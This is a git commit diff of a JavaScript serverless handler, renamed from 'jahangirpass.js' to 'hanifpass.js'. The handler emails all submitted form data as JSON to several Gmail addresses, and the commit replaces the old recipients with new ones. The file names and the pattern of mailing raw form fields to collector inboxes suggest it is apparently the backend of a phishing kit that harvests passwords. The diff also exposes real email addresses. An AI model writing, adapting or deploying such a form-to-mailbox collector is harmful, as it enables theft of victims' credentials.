6ace8f0111f58a3087da172054253086726508e0
zm9807350 <zm9807350@gmail.com>
2025-12-05 12:04:27 +0500

    Update and rename jahangirpass.js to hanifpass.js

--- hanifpass.js
+++ hanifpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage.@gmail.com,submitdispute@gmail.com,sallubhainiz1122@gmail.com",
-      subject: "Salman",
+      to: "fahadali123gg@gmail.com,linkquarry@gmail.com,lisaronnie761@gmail.com",
+      subject: "Hanif",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
